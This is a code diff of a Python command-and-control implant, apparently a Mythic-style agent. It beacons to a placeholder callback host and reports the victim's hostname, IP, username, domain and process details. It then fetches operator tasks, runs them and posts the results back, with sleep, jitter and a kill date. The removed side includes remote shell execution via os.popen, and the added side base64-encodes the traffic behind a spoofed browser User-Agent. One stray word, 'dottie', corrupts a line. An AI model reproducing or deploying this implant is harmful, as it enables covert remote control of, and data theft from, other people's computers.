@@ -1,92 +1,58 @@
-import os
-import sys
-import json
-import socket
+import os, random, sys, json, socket, base64, time, platform, getpass
 import urllib.request
-import threading
-import queue
-import time
-import random
-import platform
-import getpass
 from datetime import datetime
+import threading, queue
 
-class Igider:
-    """
-    Determines and returns the operating system version.
-    Prioritizes macOS version if available, otherwise returns system name and release.
-    """
+CHUNK_SIZE = 51200
+
+class igider:
     def getOSVersion(self):
-        if platform.mac_ver()[0]:
-            return "macOS " + platform.mac_ver()[0]
-        return platform.system() + " " + platform.release()
+        if platform.mac_ver()[0]: 
+            return "macOS "+platform.mac_ver()[0]
+        else: 
+            return platform.system() + " " + platform.release()
 
-    """
-    Retrieves the current username using getpass or environment variables.
-    """
     def getUsername(self):
-        try:
+        try: 
             return getpass.getuser()
-        except:
-            for k in ["USER", "LOGNAME", "USERNAME"]:
-                if k in os.environ:
-                    return os.environ[k]
+        except: 
+            pass
+        for k in ["USER", "LOGNAME", "USERNAME"]: 
+            if k in os.environ.keys(): 
+                return os.environ[k]
         return "unknown"
 
-    """
-    Sends a JSON message to the server via a POST request and returns the response as a JSON object.
-    """
+    def formatMessage(self, data):
+        return base64.b64encode(json.dumps(data).encode())
+
+    def formatResponse(self, data):
+        return json.loads(base64.b64decode(data).decode())
+
     def postMessageAndRetrieveResponse(self, data):
-        try:
-            headers = self.agent_config["Headers"]
-            req = urllib.request.Request(
-                f"{self.agent_config['Server']}:{self.agent_config['Port']}{self.agent_config['PostURI']}",
-                data=json.dumps(data).encode(),
-                headers=headers
-            )
-            with urllib.request.urlopen(req) as response:
-                return json.loads(response.read().decode())
-        except Exception as e:
-            print(f"Error in POST request: {e}")
-            return {}
+        return self.formatResponse(self.makeRequest(self.formatMessage(data), 'POST'))
 
-    """
-    Sends a GET request to retrieve tasks from the server.
-    """
     def getMessageAndRetrieveResponse(self, data):
-        try:
-            headers = self.agent_config["Headers"]
-            req = urllib.request.Request(
-                f"{self.agent_config['Server']}:{self.agent_config['Port']}{self.agent_config['GetURI']}?{self.agent_config['GetParam']}={json.dumps(data)}",
-                headers=headers
-            )
-            with urllib.request.urlopen(req) as response:
-                return json.loads(response.read().decode())
-        except Exception as e:
-            print(f"Error in GET request: {e}")
-            return {}
+        return self.formatResponse(self.makeRequest(self.formatMessage(data)))
 
-    """
-    Sends task output to the server, marking the task as not completed.
-    """
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{"task_id": task_id, "user_output": output, "completed": False}]
         message = {"action": "post_response", "responses": responses}
-        self.postMessageAndRetrieveResponse(message)
+        return self.postMessageAndRetrieveResponse(message)
 
-    """
-    Sends completed task responses to the server and removes successful tasks.
-    """
     def postResponses(self):
         try:
             responses = []
             for task in self.taskings:
                 if task["completed"]:
-                    out = {"task_id": task["task_id"], "user_output": task["result"], "completed": True}
-                    if task.get("error"):
+                    out = {
+                        "task_id": task["task_id"],
+                        "user_output": task["result"],
+                        "completed": True
+                    }
+                    if task["error"]: 
                         out["status"] = "error"
                     responses.append(out)
- dottie
+            
             if responses:
                 message = {"action": "post_response", "responses": responses}
                 response_data = self.postMessageAndRetrieveResponse(message)
@@ -96,50 +62,43 @@ class Igider:
         except Exception as e:
             print(f"Error posting responses: {e}")
 
-    """
-    Executes a task by calling the corresponding agent function.
-    """
     def processTask(self, task):
         try:
             task["started"] = True
             function = getattr(self, task["command"], None)
             if callable(function):
-                params = json.loads(task["parameters"]) if task["parameters"] else {}
-                params['task_id'] = task["task_id"]
-                output = function(**params)
-                task["result"] = output
+                try:
+                    params = json.loads(task["parameters"]) if task["parameters"] else {}
+                    params['task_id'] = task["task_id"]
+                    output = function(**params)
+                    task["result"] = output
+                except Exception as e:
+                    task["result"] = str(e)
+                    task["error"] = True
             else:
                 task["error"] = True
-                task["result"] = f"Command {task['command']} not found"
+                task["result"] = "Command not found"
             task["completed"] = True
         except Exception as e:
             task["error"] = True
-            task["result"] = str(e)
             task["completed"] = True
+            task["result"] = str(e)
 
-    """
-    Processes tasks by creating threads for unstarted tasks.
-    """
     def processTaskings(self):
         threads = []
         for task in self.taskings:
             if not task["started"]:
-                thread = threading.Thread(
-                    target=self.processTask,
-                    name=f"{task['command']}:{task['task_id']}",
-                    args=(task,)
-                )
-                threads.append(thread)
-                thread.start()
+                t = threading.Thread(target=self.processTask, args=(task,))
+                threads.append(t)
+                t.start()
+        for t in threads:
+            t.join()
 
-    """
-    Requests new tasks from the server and adds them to the task list.
-    """
     def getTaskings(self):
         data = {"action": "get_tasking", "tasking_size": -1}
         tasking_data = self.getMessageAndRetrieveResponse(data)
         for task in tasking_data.get("tasks", []):
-            t = {
+            self.taskings.append({
                 "task_id": task["id"],
                 "command": task["command"],
                 "parameters": task["parameters"],
@@ -147,108 +106,108 @@ class Igider:
                 "completed": False,
                 "started": False,
                 "error": False
-            }
-            self.taskings.append(t)
+            })
 
-    """
-    Performs initial check-in to the server to register the agent.
-    """
     def checkIn(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname) if hostname else ""
+
+        data = {
+            "action": "checkin",
+            "ip": ip,
+            "os": self.getOSVersion(),
+            "user": self.getUsername(),
+            "host": hostname,
+            "domain": socket.getfqdn(),
+            "pid": os.getpid(),
+            "uuid": self.agent_config["PayloadUUID"],
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86"
+        }
+        
+        response = self.makeRequest(base64.b64encode(json.dumps(data).encode()), 'POST')
+        if response:
+            try:
+                resp_data = json.loads(base64.b64decode(response).decode())
+                if "id" in resp_data:
+                    self.agent_config["UUID"] = resp_data["id"]
+                    return True
+            except:
+                pass
+        return False
+
+    def makeRequest(self, data, method='GET'):
+        headers = self.agent_config["Headers"]
+        url = f"{self.agent_config['Server']}:{self.agent_config['Port']}"
+        
         try:
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname) if hostname else ""
-            data = {
-                "action": "checkin",
-                "ip": ip,
-                "os": self.getOSVersion(),
-                "user": self.getUsername(),
-                "host": hostname,
-                "domain": socket.getfqdn(),
-                "pid": os.getpid(),
-                "uuid": self.agent_config["PayloadUUID"],
-                "architecture": "x64" if sys.maxsize > 2**32 else "x86"
-            }
-            response = self.postMessageAndRetrieveResponse(data)
-            if response.get("status") == "success":
-                self.agent_config["UUID"] = response["id"]
-                return True
-            return False
+            if method == 'GET':
+                url += f"{self.agent_config['GetURI']}?{self.agent_config['GetParam']}={data.decode()}"
+                req = urllib.request.Request(url, headers=headers)
+            else:
+                url += self.agent_config["PostURI"]
+                req = urllib.request.Request(url, data=data, headers=headers)
+            
+            with urllib.request.urlopen(req) as response:
+                return response.read()
         except Exception as e:
-            print(f"Check-in failed: {e}")
-            return False
+            print(f"Request error: {e}")
+            return None
 
-    """
-    Pauses execution based on sleep interval and jitter.
-    """
-    def agentSleep(self):
-        jitter = 0
-        if int(self.agent_config["Jitter"]) > 0:
-            jitter_value = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"]) / 100)
-            if int(jitter_value) > 0:
-                jitter = random.randrange(0, int(jitter_value))
-        time.sleep(self.agent_config["Sleep"] + jitter)
-
-    """
-    Exits the agent if the kill date has passed.
-    """
     def passedKilldate(self):
+        if not self.agent_config["KillDate"]:
+            return False
         try:
             kd_list = [int(x) for x in self.agent_config["KillDate"].split("-")]
-            kill_date = datetime(kd_list[0], kd_list[1], kd_list[2])
-            return datetime.now() >= kill_date
+            kd = datetime(kd_list[0], kd_list[1], kd_list[2])
+            return datetime.now() >= kd
         except:
             return False
 
-    """
-    Exits the agent.
-    """
-    def exit(self):
-        sys.exit(0)
+    def agentSleep(self):
+        sleep_time = self.agent_config["Sleep"]
+        if self.agent_config["Jitter"] > 0:
+            jitter = random.uniform(0, sleep_time * (self.agent_config["Jitter"]/100))
+            sleep_time += jitter
+        time.sleep(sleep_time)
 
-    """
-    Example command: Execute a shell command (placeholder for actual commands).
-    """
-    def shell(self, task_id, command):
-        try:
-            result = os.popen(command).read()
-            self.sendTaskOutputUpdate(task_id, result)
-            return result
-        except Exception as e:
-            return str(e)
-
-    """
-    Initializes the agent and enters the main loop.
-    """
     def __init__(self):
         self.taskings = []
         self.agent_config = {
             "Server": "callback_host",
             "Port": "callback_port",
             "PostURI": "/post_uri",
-            "GetURI": "/get_uri",
-            "GetParam": "query_path_name",
             "PayloadUUID": "UUID_HERE",
             "UUID": "",
-            "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
-            "Sleep": 5,
-            "Jitter": 10,
-            "KillDate": "9999-12-31"
+            "Headers": {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Content-Type": "application/json"
+            },
+            "Sleep": 10,
+            "Jitter": 0,
+            "KillDate": "",
+            "GetURI": "/get_uri",
+            "GetParam": "query"
         }
 
         while True:
             if not self.agent_config["UUID"]:
-                if not self.checkIn():
-                    self.agentSleep()
-                    continue
-            if self.passedKilldate():
-                self.exit()
-            try:
-                self.getTaskings()
-                self.processTaskings()
-                self.postResponses()
-            except Exception as e:
-                print(f"Error in main loop: {e}")
-            self.agentSleep()
+                if self.checkIn():
+                    print("Checked in successfully")
+                else:
+                    print("Checkin failed")
+                self.agentSleep()
+            else:
+                if self.passedKilldate():
+                    sys.exit(0)
+                
+                try:
+                    self.getTaskings()
+                    self.processTaskings()
+                    self.postResponses()
+                except Exception as e:
+                    print(f"Main loop error: {e}")
+                
+                self.agentSleep()
 
 if __name__ == "__main__":
-    igider = Igider()
+    agent = igider()
